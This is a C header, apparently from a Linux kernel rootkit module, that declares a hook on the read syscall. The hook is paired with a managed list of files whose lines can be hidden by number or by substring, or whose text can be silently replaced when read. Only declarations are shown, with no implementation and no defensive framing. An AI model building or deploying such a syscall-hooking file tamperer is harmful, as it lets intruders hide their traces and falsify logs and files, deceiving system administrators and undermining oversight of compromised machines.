#ifndef ALTERATE_H
#define ALTERATE_H

#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/types.h>
#include <linux/uaccess.h>

struct modified_file {
    char *file_path;
    int hide_line_with_number;
    char *hide_line_with_substring;
    char *replace_src;
    char *replace_dst;
    struct list_head list;
};

extern struct list_head modified_files_list;
extern spinlock_t modified_files_lock;

extern asmlinkage long (*__orig_read)(const struct pt_regs *);

asmlinkage long notrace read_hook(const struct pt_regs *regs);

int add_modified_file(const char *path,
                      int hide_line,
                      const char *hide_substr,
                      const char *src,
                      const char *dst);
int remove_modified_file(const char *path);
int list_modified_files(char *buf, size_t buf_size);

#endif // ALTERATE_H
